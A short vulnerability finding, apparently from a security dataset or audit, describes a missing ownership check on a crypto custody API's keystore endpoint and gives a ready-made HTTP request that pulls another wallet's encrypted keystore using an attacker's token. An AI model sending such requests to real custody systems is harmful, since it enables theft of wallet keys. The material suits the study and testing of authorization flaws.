diagnosis: The crypto custody keystore retrieval handler uses express-openapi-validator to check Ethereum address syntax, but executes the keystore retrieval without verifying that the authenticated caller is the registered owner or authorized signer of walletAddress. An attacker can retrieve encrypted keystores and derivation paths for any hosted institutional wallet.
exploit_request:
GET /api/v1/custody/wallets/0x71C836063F286367b66AA563e128c30BE538756c/keystore HTTP/1.1
Host: custody.crypto.internal:5007
Authorization: Bearer <attacker_jwt>
Accept: application/json
